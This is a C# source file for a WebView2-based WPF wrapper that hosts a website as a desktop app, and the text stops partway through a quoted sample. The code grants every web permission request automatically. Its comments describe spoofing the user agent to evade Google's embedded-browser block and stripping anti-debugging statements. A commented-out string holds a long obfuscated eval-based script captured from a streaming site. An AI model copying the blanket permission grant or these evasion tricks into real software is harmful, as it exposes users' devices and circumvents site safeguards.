using Microsoft.Extensions.Configuration;
using Microsoft.Web.WebView2.Core;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http; //needed for IHttpClientFactory, from Microsoft.Extensions.Http nuget package
using System.Text;
//using System.Linq;
//using System.Security.Policy;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;


namespace GenericWebAppWpfWrapper
{

    public partial class MainWindow : Window
    {
        private bool isReallyExit = false;
        private readonly IConfiguration config;
        private readonly IHttpClientFactory httpClientFactory;
        private readonly IServiceProvider serviceProvider;

        public readonly string BasePath = Directory.GetCurrentDirectory(); //.GetParent(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location)).FullName;
        public readonly string StartUrl;
        public readonly bool SeparateUserData = false;
        public readonly bool BlockExternalLinks = false;
        public readonly string[] AllowedScripts = null;
        public readonly double? AspectRatio;

        public MainWindow(IConfiguration config, IHttpClientFactory httpClientFactory, IServiceProvider serviceProvider)
        {
            this.config = config;
            this.httpClientFactory = httpClientFactory;
            this.serviceProvider = serviceProvider;

            this.StartUrl = config["Url"];
            this.Title = config["Title"];

            string iconPath = Path.Combine(BasePath, config["Title"].Replace(" ", "") + ".ico");
            if (File.Exists(iconPath)) this.Icon = new BitmapImage(new Uri(iconPath));
            else _ = SetFaviconAsIconAsync(this.StartUrl, iconPath);

            _ = bool.TryParse(config["SeparateUserData"], out this.SeparateUserData);
            bool.TryParse(config["BlockExternalLinks"], out BlockExternalLinks);
            this.AllowedScripts = string.IsNullOrWhiteSpace(config["AllowedScripts"]) ? null : config["AllowedScripts"].Split(",");
            if (!string.IsNullOrEmpty(config["AspectRatio"])) this.AspectRatio = double.Parse(config["AspectRatio"].Split(":")[0]) / double.Parse(config["AspectRatio"].Split(":")[1]);

            if (this.AspectRatio == null) this.WindowState = WindowState.Minimized;

            InitializeComponent();
        }



        private async System.Threading.Tasks.Task SetFaviconAsIconAsync(string url, string iconPath)
        {
            try
            {
                var client = httpClientFactory.CreateClient();
                var html = await client.GetStringAsync(url);
                var iconUrls = new System.Collections.Generic.List<(string href, int size)>();
                var doc = new HtmlAgilityPack.HtmlDocument();
                doc.LoadHtml(html);
                foreach (var link in doc.DocumentNode.SelectNodes("//link[@rel='icon' or @rel='shortcut icon' or @rel='apple-touch-icon']") ?? Enumerable.Empty<HtmlAgilityPack.HtmlNode>())
                {
                    var href = link.GetAttributeValue("href", null);
                    var sizes = link.GetAttributeValue("sizes", "");
                    int size = 0;
                    if (!string.IsNullOrEmpty(sizes) && sizes.Contains("x"))
                    {
                        var parts = sizes.Split('x');
                        int.TryParse(parts[0], out size);
                    }
                    if (!string.IsNullOrEmpty(href))
                    {
                        if (!href.StartsWith("http"))
                        {
                            var baseUri = new Uri(url);
                            href = new Uri(baseUri, href).ToString();
                        }
                        iconUrls.Add((href, size));
                    }
                }
                if (!iconUrls.Any())
                {
                    var baseUri = new Uri(url);
                    iconUrls.Add((baseUri.Scheme + "://" + baseUri.Host + "/favicon.ico", 0));
                }
                var bestIcon = iconUrls.OrderByDescending(i => i.size).FirstOrDefault();
                var iconBytes = await client.GetByteArrayAsync(bestIcon.href);

                File.WriteAllBytes(iconPath, iconBytes);

                using var ms = new MemoryStream(iconBytes);

                var decoder = new IconBitmapDecoder(ms, BitmapCreateOptions.None, BitmapCacheOption.OnLoad);

                // Pick the largest frame by pixel dimensions
                var largest = decoder.Frames
                    .OrderByDescending(f => f.PixelWidth * f.PixelHeight)
                    .FirstOrDefault();
                largest?.Freeze(); // Optional for thread safety
                var cropped = largest.CropTransparentPixels();

                this.Dispatcher.Invoke(() =>
                {
                    this.Icon = cropped;
                    //this.Hide();
                    //this.Show();
                });
            }
            catch { /* ignore errors, fallback to no icon */ }
        }

        protected override void OnRenderSizeChanged(SizeChangedInfo sizeInfo)
        {
            if (this.AspectRatio == null) return;

            if (sizeInfo.WidthChanged) this.Width = sizeInfo.NewSize.Height * this.AspectRatio.Value;
            else this.Height = sizeInfo.NewSize.Width / this.AspectRatio.Value;
        }


        public override void OnApplyTemplate()
        {
            var oDep = GetTemplateChild("btnQuit");
            if (oDep != null)
            {
                ((Button)oDep).Click += this.btnQuit_Click;
            }

            base.OnApplyTemplate();
        }

        private void btnQuit_Click(System.Object sender, System.Windows.RoutedEventArgs e)
        {
            isReallyExit = true;
            this.Close();
        }

        // https://github.com/dotnet/wpf/issues/3627#issuecomment-902293654
        static private (double height, double width) GetVirtualWindowSize()
        {
            Window virtualWindow = new Window();
            virtualWindow.Opacity = 0;
            virtualWindow.Show();
            virtualWindow.WindowState = WindowState.Maximized;
            double returnHeight = virtualWindow.Height;
            double returnWidth = virtualWindow.Width;
            virtualWindow.Close();
            return (returnHeight, returnWidth);
        }

        static private WindowStyle restoreWindowStyle = new();
        protected override void OnKeyDown(KeyEventArgs e)
        {
            base.OnKeyDown(e);

            if (!e.Handled)
            {
                switch (e.Key)
                {
                    // minimize
                    case Key.Escape:
                        WindowState = WindowState.Minimized;
                        break;

                    // full screen mode
                    case Key.F11:
                        switch (WindowState)
                        {
                            case WindowState.Normal:
                                restoreWindowStyle = WindowStyle;
                                WindowStyle = WindowStyle.None;
                                //var sizingParams = GetVirtualWindowSize();
                                WindowState = WindowState.Maximized;
                                //Height = sizingParams.height;
                                //Width = sizingParams.width;
                                break;
                            case WindowState.Maximized:
                                WindowStyle = restoreWindowStyle;
                                WindowState = WindowState.Normal;
                                break;
                            default:
                                break;
                        }
                        break;

                    case Key.F10:
                        Topmost = !Topmost;
                        break;
                }
            }
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (!isReallyExit)
            {
                e.Cancel = true; // this will prevent to close
                WindowState = WindowState.Minimized;
            }
        }
        private void Wv2_WebMessageReceived(object sender, CoreWebView2WebMessageReceivedEventArgs e)
        {
            string countText = e.TryGetWebMessageAsString();

            int iconWidth = 20;
            int iconHeight = 20;

            RenderTargetBitmap bmp = new RenderTargetBitmap(iconWidth, iconHeight, 96, 96, PixelFormats.Default);
            ContentControl root = new ContentControl();

            root.ContentTemplate = (DataTemplate)Resources["OverlayIcon"];
            root.Content = countText == "0" ? null : countText;

            root.Arrange(new Rect(0, 0, iconWidth, iconHeight));

            bmp.Render(root);

            TaskbarItemInfo.Overlay = bmp;
        }

        private string savedUserAgent;
        private void webView_Initialized(object wvInitSender, System.EventArgs e)
        {
            wv2.CoreWebView2InitializationCompleted += (object sender, CoreWebView2InitializationCompletedEventArgs e) =>
            {

                //https://stackoverflow.com/questions/57479245/how-to-add-support-for-html5-notifications-in-xaml-webview-in-a-uwp-app/57503529#57503529
                wv2.CoreWebView2.PermissionRequested += (object sender, CoreWebView2PermissionRequestedEventArgs e) =>
                {
                    //MessageBox.Show("wv2.CoreWebView2.PermissionRequested\r\n\r\nPermissionKind: " + e.PermissionKind + "\r\n\r\nUri: " + e.Uri);
                    e.State = CoreWebView2PermissionState.Allow;
                };

                wv2.CoreWebView2.NavigationStarting += (object sender, CoreWebView2NavigationStartingEventArgs e) =>
                {
                    if (this.BlockExternalLinks && (new Uri(e.Uri)).Host != (new Uri(this.StartUrl)).Host)
                    {
                        e.Cancel = true;
                        return;
                    }

                    //see massive thread on the need for user agent string with google auth: https://github.com/MicrosoftEdge/WebView2Feedback/issues/1647#issuecomment-1063861835
                    //important, it must be set in something later in the lifecycle like NavigationStarting 

                    //but fyi, stuff like whatsapp requires something valid
                    //example user agent strings: https://deviceatlas.com/blog/list-of-user-agent-strings#android

                    //need to flip user agent specifically when on google login page or google blocks with
                    //"Couldn't sign you in... This browser or app may not be secure."
                    savedUserAgent ??= wv2.CoreWebView2.Settings.UserAgent;
                    //wv2.CoreWebView2.Settings.UserAgent = (new Uri(e.Uri)).Host.Contains("accounts.google.com") ? "could be anything" : savedUserAgent;

                    //MessageBox.Show("wv2.CoreWebView2.NavigationStarting\r\n\r\nurl: " + e.Uri + "\r\n\r\nuseragent: " + wv2.CoreWebView2.Settings.UserAgent);
                };

                wv2.CoreWebView2.NewWindowRequested += (object sender, CoreWebView2NewWindowRequestedEventArgs newWindowArgs) =>
                {
                    //let certain urls do their normal popup thing since it's how gmail launches the print preview popup and stuff like that
                    if (
                        newWindowArgs.Uri.StartsWith("about://")
                        || newWindowArgs.Uri.Contains("mail.google.com")
                    ) { }

                    //else if (newWindowArgs.Uri.Contains("accounts.google.com")) { }

                    else if (
                        //if we're launching a new window for google login,
                        //we need to send it back to the existing webview so we can control the UserAgent
                        //which is the crucial piece of avoiding google's embedded-webview block
                        newWindowArgs.Uri.Contains("accounts.google.com")

                        // also trap in local window if we're just trying to get back to the root url of this app (became necessary for some oddball login flows with google voice)
                        || newWindowArgs.Uri.StartsWith(this.StartUrl)
                       )
                    {
                        //newWindowArgs.NewWindow = wv2.CoreWebView2; //this worked for voice.google.com but crashed for mail.google.com
                        newWindowArgs.Handled = true;
                        wv2.CoreWebView2.Navigate(newWindowArgs.Uri);
                    }

                    else if (this.BlockExternalLinks)
                    {
                        //besides ignoring external links completely,
                        //  the BlockExternalLinks flag also routes *internal* links back into the existing webview
                        if (new Uri(newWindowArgs.Uri).Host == new Uri(this.StartUrl).Host)
                            wv2.CoreWebView2.Navigate(newWindowArgs.Uri);

                        newWindowArgs.Handled = true;
                        return;
                    }

                    //otherwise launch external links out to OS's default browser to get the best experience with cached logins and extensions, versus trapped in the self contained web view
                    else
                    {
                        newWindowArgs.Handled = true;

                        // some unexpected finesse required to get down to clean urls, especially when clicking links in gmail...
                        // gmail embeds what is probably a tracking wrapper around all urls so strip that off before launching because somehow it triggered launching android subsystem for windows on my machine?!?!
                        var url = newWindowArgs.Uri;
                        var match = System.Text.RegularExpressions.Regex.Match(url, @"https:\/\/www\.google\.com\/url\?(.*?)(q|url)=(.*?)&", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                        if (match.Success) { url = match.Groups[3].Value; }

                        //hopefully doing this all the time doesn't have negative side effects??
                        url = System.Web.HttpUtility.UrlDecode(url);

                        txtMessage.Text = "launching url: " + url;

                        System.Diagnostics.Process.Start(
                            new System.Diagnostics.ProcessStartInfo
                            {
                                FileName = url,
                                Verb = "open",
                                UseShellExecute = true
                            }
                        );
                    }

                    //////////////////////////////////////////////////////////////////////////////
                    //i tried a bunch of stuff to instantiate a new webview
                    //but none of them would hit the CoreWebView2InitializationCompleted event
                    //i'm guessing we need to embed the webview in a wpf form for it to work

                    //Changes to settings should be made BEFORE setting NewWindow to ensure that those settings take effect for the newly setup WebView.

                    //msft webview2 team stack-o sample code: https://stackoverflow.com/questions/65087294/how-do-i-get-reference-to-the-new-window-in-webview2/65132490#65132490
                    //gotta use Deferalls pattern to handle async creation of new CoreWebView2: https://docs.microsoft.com/en-us/microsoft-edge/webview2/concepts/threading-model#deferrals
                    //var deferall = newWindowArgs.GetDeferral();
                    //var newV = new Microsoft.Web.WebView2.Wpf.WebView2();
                    //newV.Initialized += (object sender, EventArgs e) => {
                    //newV.CoreWebView2InitializationCompleted += (object sender, CoreWebView2InitializationCompletedEventArgs newVargs) =>
                    //{
                    //    newV.CoreWebView2.Settings.UserAgent = "chrome";
                    //    newWindowArgs.NewWindow = newV.CoreWebView2;
                    //    newWindowArgs.Handled = true;
                    //    deferall.Complete();
                    //    //newV.CoreWebView2.Navigate(newWindowArgs.Uri);
                    //};
                    //newV.Source = new Uri(newWindowArgs.Uri);
                    //newV.EnsureCoreWebView2Async();
                    //};

                };

                //inject javascript function that scrapes the chat page for message count
                //here's a good thread: https://github.com/MicrosoftEdge/WebView2Feedback/issues/253#issuecomment-641577176
                //another good thread: https://blogs.msmvps.com/bsonnino/2021/02/27/using-the-new-webview2-in-a-wpf-app/
                //https://www.fatalerrors.org/a/excerpt-interaction-between-webview2-and-js.html

                //AddScriptToExecuteOnDocumentCreatedAsync fires on frames as well which gives us full power to override spammity spam vs just the main page
                var embeddedScriptFilePath = Path.Combine(BasePath, config["Title"].Replace(" ", "") + ".js");
                if (File.Exists(embeddedScriptFilePath))
                    wv2.CoreWebView2.AddScriptToExecuteOnDocumentCreatedAsync(File.ReadAllText(embeddedScriptFilePath));

                if (this.AllowedScripts != null)
                {
                    wv2.CoreWebView2.AddWebResourceRequestedFilter("*", CoreWebView2WebResourceContext.Script);
                    //wv2.CoreWebView2.AddWebResourceRequestedFilter("*", CoreWebView2WebResourceContext.Document);
                    //wv2.CoreWebView2.WebResourceResponseReceived += (object sender, CoreWebView2WebResourceResponseReceivedEventArgs e) =>
                    //{
                    //    //e.Response.con
                    //};

                    wv2.CoreWebView2.WebResourceRequested += (object sender, CoreWebView2WebResourceRequestedEventArgs e) =>
                    {
                        //if (e.ResourceContext == CoreWebView2WebResourceContext.Document)
                        //{
                        //    var requestUri = new Uri(e.Request.Uri);
                        //    if (requestUri.Host != new Uri(this.StartUrl).Host) return;

                        //    //if (new Uri(e.Request.Uri).Host != new Uri(this.StartUrl).Host)
                        //    //{
                        //    using var deferral = e.GetDeferral();

                        //    //var cookieContainer = new CookieContainer();
                        //    //using (var handler = new HttpClientHandler() { CookieContainer = cookieContainer })
                        //    //cookieContainer.Add(new Cookie("CookieName", "cookie_value"));
                        //    HttpRequestMessage request = new()
                        //    {
                        //        RequestUri = requestUri,
                        //        Method = e.Request.Method == "POST" ? HttpMethod.Post : HttpMethod.Get,
                        //        Content = e.Request.Content != null ? new StreamContent(e.Request.Content) : null
                        //    };
                        //    e.Request.Headers.ForEach(h => request.Headers.TryAddWithoutValidation(h.Key, h.Value));

                        //    var client = httpClientFactory.CreateClient("default");

                        //    //if (e.Request.Headers.Contains("Cookie"))
                        //    //{
                        //    //    request.Headers.Remove("Cookie");
                        //    //    //var cookieChunks = e.Request.Headers.GetHeader("Cookie").Split("; ");
                        //    //    //var cookieContainer = serviceProvider.GetRequiredService<CookieContainer>();
                        //    //    //cookieChunks.ForEach(chunk =>
                        //    //    //{
                        //    //    //    var nameValue = chunk.Split("=");
                        //    //    //    cookieContainer.Add(new Cookie { Name = nameValue[0], Path = "/", Domain = request.RequestUri.Host, Value = nameValue[1], HttpOnly = true, Secure = true });
                        //    //    //});
                        //    //    client.DefaultRequestHeaders.Add("Cookie", e.Request.Headers.GetHeader("Cookie"));
                        //    //}

                        //    var response = client.SendAsync(request).Result;
                        //    //using var reader = new StreamReader(e.Request.Content, Encoding.UTF8);
                        //    //var strContent = reader.ReadToEnd();
                        //    //var response = e.Request.Method == "POST" ? client.PostAsync(e.Request.Uri, new StreamContent(e.Request.Content)).Result : client.GetAsync(e.Request.Uri).Result;
                        //    var content = response.Content.ReadAsStringAsync().Result;
                        //    content = content.Replace("atob", "console.log");
                        //    e.Response = wv2.CoreWebView2.Environment.CreateWebResourceResponse(content.ToStream(), 200, "OK", null);
                        //    //}

                        //    return;

                        //}

                        //if not a script request or the one script that truly matters for playing the video, allow it pass unscathed
                        if (
                            this.AllowedScripts.Any(scriptNameFragment => e.Request.Uri.Contains(scriptNameFragment))
                        )
                            return;
                        else
                        {
                            //otherwise reject it
                            e.Response = wv2.CoreWebView2.Environment.CreateWebResourceResponse(null, 404, "Not found", null);
                            return;
                        }

                        //there's often two layers of "eval()"ing obfuscuted strings...
                        //eventually resulting in the final js that gets executed
                        //inside that final script, it's a common tactic to include some "debugger" statements inside of a tight timer...
                        //this essentially puts the browser debug window in perpetual pause mode which makes it difficult to reverse gen anything and develop workarounds
                        //sooo... this whole clode block does the webrequest manually and then hacks out the debugger statements

                        //example request response payload
                        //var resp = "<html lang=\"en\"><title></title><meta charset=\"utf-8\"><meta content=\"width=device-width,initial-scale=1\" name=\"viewport\"><meta content=\"noindex,nofollow\" name=\"robots\"><meta content=\"no-referrer-when-downgrade\" name=\"referrer\"><meta content=\"upgrade-insecure-requests\" http-equiv=\"Content-Security-Policy\"><link href=\"https://plytv.rocks\" rel=\"preconnect\" crossorigin><link href=\"https://cdn.tvply.me/icons/favicon-16x16.png\" rel=\"icon\" sizes=\"16x16\" type=\"image/png\"><style>body{background-color:#000;font-size:14px;height:100%;left:0;top:0;width:100%;border:0 none;margin:0;padding:0;}.d-none{display:none;}</style><style>.jw-display-controls .jw-display-icon-container{background-color:#e86464;border-radius:10%}.jw-display .jw-icon{width:148px!important}.jw-display-controls .jw-display-icon-container .jw-icon{color:#fff}.jw-rightclick{display:none!important}@media only screen and (max-width:600px){.jw-display .jw-icon{width:77px!important}}</style><script src=\"https://cdn.tvply.me/scripts/jquery.js\"></script><script src=\"https://cdn.tvply.me/scripts/player/8.22.0/jwplayer.js\"></script><script src=\"https://cdn.vdosupreme.com/vdo.js?id=hmva77jch1bw3nzzgt0w\"></script><script src=\"https://cdn.vdosupreme.com/vdo.ios.web.plugin.js\"></script><script src=\"https://cdn.vdosupreme.com/vdo.jwplayer8.plugin.js\"></script></head><body>    <div id=\"c8h4s4y7s6\" class=\"banner-300\"></div>\n    <script>\n        let QpEbgM = '';let AIQgoyubGBt = 'var _0xc12e=[\"\",\"split\",\"0123456',LQGqTbwUn = AIQgoyubGBt,sgvQq = '789abcdefghijklmnopqrstuvwxyzABC',uZVHmvGMhe = sgvQq;\nlet VtyAvaWgYGXPbo = 'DEFGHIJKLMNOPQRSTUVWXYZ+/\",\"slic',YblZzvpUjLSNHEt = VtyAvaWgYGXPbo;\nlet XVITtRCdvYgPf = 'e\",\"indexOf\",\"\",\"\",\".\",\"pow\",\"re';\nlet ZqwGzm = XVITtRCdvYgPf;\nlet SJldfyozIk = 'duce\",\"reverse\",\"0\"];function _0';\nlet iIbHYqktGhpNML = SJldfyozIk;\nlet MaCIorsBfY = 'xe55c(d,e,f){var g=_0xc12e[2][_0';\nlet AEqQKGLdWRZgOY = MaCIorsBfY;\nlet kYeUsqVacH = 'xc12e[1]](_0xc12e[0]);var h=g[_0';\nlet qIwiKWMGhUPg = kYeUsqVacH,MEpGRlTz = 'xc12e[3]](0,e);var i=g[_0xc12e[3';\nlet zDPwaHCToeb = MEpGRlTz;\nlet iFwbMTfUjX = ']](0,f);var j=d[_0xc12e[1]](_0xc';\nlet dryVf = iFwbMTfUjX;\nlet DCJkdoblwKVBTe = '12e[0])[_0xc12e[10]]()[_0xc12e[9',ZsWLKcwxzva = DCJkdoblwKVBTe,rVjZtpqXGSLnYo = ']](function(a,b,c){if(h[_0xc12e[';\nlet WqEnNPIumilyRwj = rVjZtpqXGSLnYo;\nlet wLsTncUuyK = '4]](b)!==-1)return a+=h[_0xc12e[';\nlet FPyCK = wLsTncUuyK,irapIePUWs = '4]](b)*(Math[_0xc12e[8]](e,c))},';\nlet IpuTzvnQWg = irapIePUWs;\nlet oTLzZ = '0);var k=_0xc12e[0];while(j>0){k',OguHRMwGlBLK = oTLzZ,bakUFNxfYE = '=i[j%f]+k;j=(j-(j%f))/f}return k',ywkNKRDO = bakUFNxfYE,pcZsWCljYvS = '||_0xc12e[11]}eval(function(h,u,',OXxahS = pcZsWCljYvS;\nlet CfTaGNh = 'n,t,e,r){r=\"\";for(var i=0,len=h.',NWGxU = CfTaGNh;\nlet mGJEFYUX = 'length;i<len;i++){var s=\"\";while';\nlet abGCPFOewvKpZ = mGJEFYUX,vkoMYKZdyPe = '(h[i]!==n[e]){s+=h[i];i++}for(va';\nlet yYqxugzmMP = vkoMYKZdyPe;\nlet LtblaOjrJTmD = 'r j=0;j<n.length;j++)s=s.replace',rDSBQ = LtblaOjrJTmD,KGTHQnixNRF = '(new RegExp(n[j],\"g\"),j);r+=Stri',jieyLMTJSX = KGTHQnixNRF,EOSeTUbvpc = 'ng.fromCharCode(_0xe55c(s,e,10)-';\nlet VgFyefq = EOSeTUbvpc;\nlet FPYsCfJV = 't)}return decodeURIComponent(esc';\nlet QbHAEVIxhnea = FPYsCfJV,uIVhlF = 'ape(r))}(\"DgYsgTYTwDYTwZYTsTYTsi';\nlet ElTUHPoqahuwi = uIVhlF;\nlet xVQrHl = 'YDgYsgZYTwDYTssYTweYsgwYTseYTsiY';\nlet zpRDgCvQKya = xVQrHl,OeFNJxbzwD = 'sggYTseYTssYTwiYDgYsTeYDgYsgZYTs',tymcX = OeFNJxbzwD;\nlet ETNJVBFhQuXa = 'eYTwZYsgTYTsiYTwwYTwDYTwZYDgYggY';\nlet HAmhuGBTXI = ETNJVBFhQuXa;\nlet ctRIVywnKhjLHN = 'sgiYsgwYTsiYsgwYswwYDgYTTTYDgYTw';\nlet XQctpabxdqZ = ctRIVywnKhjLHN,xcKEsDlYqrh = 'wYsgZYDgYggYTsiYTTwYTwgYsgeYTwDY',QPoXlkTNU = xcKEsDlYqrh;\nlet PpxunLBdr = 'sgZYDgYsgiYsgwYTsiYsgwYswZYTsTYs';\nlet mFcWYx = PpxunLBdr,acufImDGpRjerVz = 'gTYTwDYsgiYsgeYDgYsTeYsTeYsTeYDg',efvOEcU = acufImDGpRjerVz,byqTxZNevm = 'YgDYTseYTwZYsgiYsgeYsgZYTwwYTwZY',YBLdzNoa = byqTxZNevm,fJjmTuGc = 'sgeYsgiYgDYDgYTTiYTTiYDgYTsiYTTw';\nlet lePfLMYr = fJjmTuGc;\nlet VBuMp = 'YTwgYsgeYTwDYsgZYDgYsgiYsgwYTsiY',tHRQIN = VBuMp;\nlet FKgZysdlJqaOk = 'sgwYswZYTsiYTsTYDgYsTeYsTeYsTeYD';\nlet ltsXASEBORHfZjQ = FKgZysdlJqaOk,uDPebdCv = 'gYgDYTseYTwZYsgiYsgeYsgZYTwwYTwZ',rucixhVzSdygL = uDPebdCv;\nlet xPaMEBJiq = 'YsgeYsgiYgDYswwYDgYTTTYDgYTssYsg',UVzkbqZBEo = xPaMEBJiq,CBdRwtocn = 'eYTsiYTseYTssYTwZYDgYgDYgDYsTTYD';\nlet TwImZoqN = CBdRwtocn;\nlet URJdHOLx = 'gYTTeYDgYTssYsgeYTsiYTseYTssYTwZ';\nlet jfaOcQuoAxkWDE = URJdHOLx;\nlet pSiUZr = 'YDgYTsDYTwwYTwZYsgiYTwDYTsDYswZY';\nlet WycONvehAPuxjSd = pSiUZr,JfSyRA = 'sgwYTsiYTwDYsgsYggYsgwYTseYTsiYs';\nlet oeDciHklPpEu = JfSyRA;\nlet tliGJNzakHPeA = 'ggYsiTYsgwYTwiYTwiYsZeYTssYTwiYs';\nlet tuByLNsQIlPHwb = tliGJNzakHPeA;\nlet PAfdRKZvqW = 'wwYDgYswTYDgYgDYsTDYTsTYTsiYTssY';\nlet NzSyF = PAfdRKZvqW;\nlet yfulQbPcZ = 'sgeYsgwYTweYsTeYgDYDgYswTYDgYTse';\nlet rXmNJpbyYSgPKi = yfulQbPcZ,RHAIMgvuSoisN = 'YTwZYTswYTwwYTseYsgeYsewYsgiYDgY';\nlet oMwJjzpcFBs = RHAIMgvuSoisN,fCryqAOkiVdcQW = 'swTYDgYgDYgZYTsTYsgTYTwDYsgiYsge',LWhsA = fCryqAOkiVdcQW,oYLiPXQNSbevw = 'YsTeYgDYDgYswTYDgYsgiYsgwYTsiYsg';\nlet EqNnPJTUQZKsgL = oYLiPXQNSbevw;\nlet HlUuBag = 'wYswZYTsTYsgTYTwDYsgiYsgeYDgYswT',crQLvphom = HlUuBag,RoTEn = 'YDgYgDYgZYsgeYTsgYTwgYTwwYTssYsg',hnCMaBD = RoTEn;\nlet VWiBGYJlF = 'eYTsTYsTeYgDYDgYswTYDgYsgiYsgwYT',mcSPY = VWiBGYJlF;\nlet GhivrLCY = 'siYsgwYswZYTsiYTsTYsTTYDgYTTeYsT';\nlet WqvUabQ = GhivrLCY,JwaHZgoRXLGY = 'TYDgYsgTYTwDYTwZYTsTYTsiYDgYTsTY',eJvkfbWU = JwaHZgoRXLGY;\nlet NXtWForxCil = 'TsiYTwDYTwgYTwgYTwiYsgwYTTwYsgeY';\nlet QmxzjryLkK = NXtWForxCil;\nlet CZnuPNArKoxO = 'TssYDgYsTeYDgYsgZYTseYTwZYsgTYTs',FUZEOkqyreaNtQ = CZnuPNArKoxO;\nlet StEZhTR = 'iYTwwYTwDYTwZYDgYggYswwYDgYTTTYD',rxwDktuUaFQTq = StEZhTR,KhTbNnlJpgactV = 'gYsgwYTseYTsiYsggYsZeYTssYTwiYDg';\nlet GZFaUoTfy = KhTbNnlJpgactV;\nlet cSEKxBsuUlmGtYk = 'YsTeYDgYgDYgDYsTTYDgYTwgYTwiYsgw',spcHxlXmGELtify = cSEKxBsuUlmGtYk,wIqrJvPEsCik = 'YTTwYsgeYTssYseDYsgsYTwsYswZYTsT';\nlet dJLXWkxt = wIqrJvPEsCik;\nlet vgHeyrLEd = 'YTsiYTwDYTwgYggYswwYsTTYDgYTwgYT',BjMoalqOyfdiYG = vgHeyrLEd,FzeKTrMmdJLRBl = 'wiYsgwYTTwYsgeYTssYseDYsgsYTwsYs',KCcQnUsFmzt = FzeKTrMmdJLRBl,fSilceIRD = 'wZYTssYsgeYTweYTwDYTsZYsgeYggYsw',NkIEbsFKMcopeu = fSilceIRD;\nlet KcXkYoWJHC = 'wYsTTYDgYsgTYTwiYsgeYsgwYTssYsZi',lbpDXCAKLJfUTV = KcXkYoWJHC,YRaQSZ = 'YTwwYTweYsgeYTwDYTseYTsiYggYsgiY';\nlet yFXrL = YRaQSZ;\nlet ovVwnIRk = 'sgeYsgwYTseYTsiYsggYsgTYTssYTwDY',mFtHRqM = ovVwnIRk;\nlet JWxabr = 'TwZYswwYsTTYDgYsgwYTwsYTsgYsZsYs',GTtUbCI = JWxabr,tBOMZgkAWedDYym = 'geYTswYTseYsgeYTsTYTsiYswZYsgwYs';\nlet YameLBZSvy = tBOMZgkAWedDYym;\nlet dRXfMHtom = 'gsYTwDYTssYTsiYggYswwYsTTYDgYTww';\nlet DYaTyW = dRXfMHtom;\nlet hezqPpiujRtrV = 'YsgZYDgYggYTwgYTwiYsgwYTTwYsgeYT';\nlet cECQiufN = hezqPpiujRtrV;\nlet pfDOqueAM = 'ssYseDYsgsYTwsYswZYsgiYsgeYTsTYT';\nlet VCxeWwmI = pfDOqueAM,yNbeYQMLTrDcZpq = 'siYTssYTwDYTTwYswwYDgYTTTYDgYTwg',UsFjVJlnNQ = yNbeYQMLTrDcZpq,jseLS = 'YTwiYsgwYTTwYsgeYTssYseDYsgsYTws';\nlet rDLmWdNIkTnGBoj = jseLS;\nlet JVpOjfnw = 'YswZYsgiYsgeYTsTYTsiYTssYTwDYTTw',JXfqeu = JVpOjfnw,vjFLNEVA = 'YggYswwYsTTYDgYTTeYDgYTsDYTwwYTw';\nlet NBxcKy = vjFLNEVA;\nlet YajkAduVpem = 'ZYsgiYTwDYTsDYswZYTwiYTwDYsgTYsg',pIZHN = YajkAduVpem;\nlet bPjngcx = 'wYTsiYTwwYTwDYTwZYDgYsTeYDgYgDYT',cKaquoYPwiv = bPjngcx,azfdRbStBG = 'siYsgeYsgTYsggYTwwYTsTYTsTYTseYs';\nlet aIZGXhOVHLN = azfdRbStBG;\nlet YZIXgFCbPnfwAB = 'geYswZYsggYTsiYTweYTwiYgDYsTTYDg';\nlet dwHoBfhcsG = YZIXgFCbPnfwAB,LnkWUeiDx = 'YTTeYsTTYDgYTwiYsgeYTsiYDgYsgiYs',dGaKpUH = LnkWUeiDx,QGcRiFalK = 'geYsgwYTseYTsiYsggYsgTYTssYTwDYT',PWHmpBAErD = QGcRiFalK;\nlet NumGKsotSrZB = 'wZYsTTYDgYsgTYTwDYTwZYTsTYTsiYDg';\nlet XVpfGL = NumGKsotSrZB;\nlet FSObCAyQBLtJ = 'YsgeYTwZYsgwYsgsYTwiYsgeYsegYsge';\nlet MynfJ = FSObCAyQBLtJ;\nlet zsQOuAv = 'YsgeYTssYDgYsTeYDgYsswYsTTYDgYsg',zRqiyjXZDx = zsQOuAv,tpQOPiCl = 'TYTwDYTwZYTsTYTsiYDgYsgZYTwDYTss',BspdSRhnelICqcA = tpQOPiCl;\nlet tOnNMiQTxbf = 'YsgTYsgeYsegYsgeYsgeYTssYDgYsTeY',mndNHaveyBOJK = tOnNMiQTxbf;\nlet pIJgPfvLasloXBk = 'DgYswgYsTTYDgYsgTYTwDYTwZYTsTYTs',EmSaIpnGlVZRcs = pIJgPfvLasloXBk,JTgEvk = 'iYDgYsgeYTwZYsgwYsgsYTwiYsgeYseg',mIsvOnhG = JTgEvk,jvDabWGwOAEK = 'YsgeYsgeYTssYsiTYsgwYsgTYsggYsge';\nlet hWTKFyBDrpHXOY = jvDabWGwOAEK,cVGuxwrTIOsqilP = 'YDgYsTeYDgYswgYsTTYDgYsgTYTwDYTw',vCbfpJhTnRGVKe = cVGuxwrTIOsqilP,wCoPyT = 'ZYTsTYTsiYDgYTwgYsgeYsgeYTssYseD';\nlet NYBSHodJF = wCoPyT,yfbeJ = 'YsgsYTwsYDgYsTeYDgYTsDYTwwYTwZYs',YyaexSbXMsclj = yfbeJ;\nlet tgaRBDuwV = 'giYTwDYTsDYswZYTwgYsgeYsgeYTssYs';\nlet IhRBnpGP = tgaRBDuwV,qRxiluhSyo = 'seYsTTYDgYsgTYTwDYTwZYTsTYTsiYDg';\nlet iQtDfmOP = qRxiluhSyo;\nlet NqYKBr = 'YsgwYTseYTsiYsggYsgTYsggYsgeYsgT';\nlet lUktXVTYDqmEyN = NqYKBr,ZEmJgrovFu = 'YTwTYDgYsTeYDgYsgZYTseYTwZYsgTYT',WrOap = ZEmJgrovFu;\nlet BTCcIfzNDMmO = 'siYTwwYTwDYTwZYDgYggYswwYDgYTTTY';\nlet XMBzIRxkOVwct = BTCcIfzNDMmO,PSHME = 'DgYTwwYsgZYDgYggYggYsgeYTwZYsgwY',QORtIjvswMTPh = PSHME,DtyoEGYFBaAKm = 'sgsYTwiYsgeYsegYsgeYsgeYTssYDgYs',wZbXRfsEaJImTF = 